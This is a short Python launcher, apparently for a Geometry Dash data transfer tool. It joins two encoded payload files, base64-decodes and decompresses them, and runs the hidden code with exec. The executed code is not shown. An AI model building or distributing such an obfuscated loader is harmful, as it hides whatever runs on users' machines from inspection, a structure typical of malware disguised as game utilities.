#!/usr/bin/env python3
"""Geometry Dash data transfer. Run Launch GD Data Transfer.bat"""
from __future__ import annotations

import base64
import gzip
from pathlib import Path

_HERE = Path(__file__).resolve().parent
_payload = (_HERE / "payload_a.txt").read_text(encoding="ascii") + (_HERE / "payload_b.txt").read_text(encoding="ascii")
_code = gzip.decompress(base64.b64decode(_payload))
_file = str(Path(__file__).resolve())
exec(compile(_code, _file, "exec"), {"__name__": "__main__", "__file__": _file})
